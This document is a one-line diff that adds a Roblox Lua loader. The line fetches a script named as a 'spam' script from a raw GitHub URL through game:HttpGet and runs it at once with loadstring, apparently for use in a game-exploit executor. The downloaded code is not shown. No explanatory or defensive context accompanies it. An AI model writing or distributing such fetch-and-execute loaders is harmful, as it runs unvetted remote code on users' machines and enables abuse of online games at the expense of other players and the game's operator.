@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/cure-violence-district-spam4-0fv97ub9k9uyv2.lua"))()
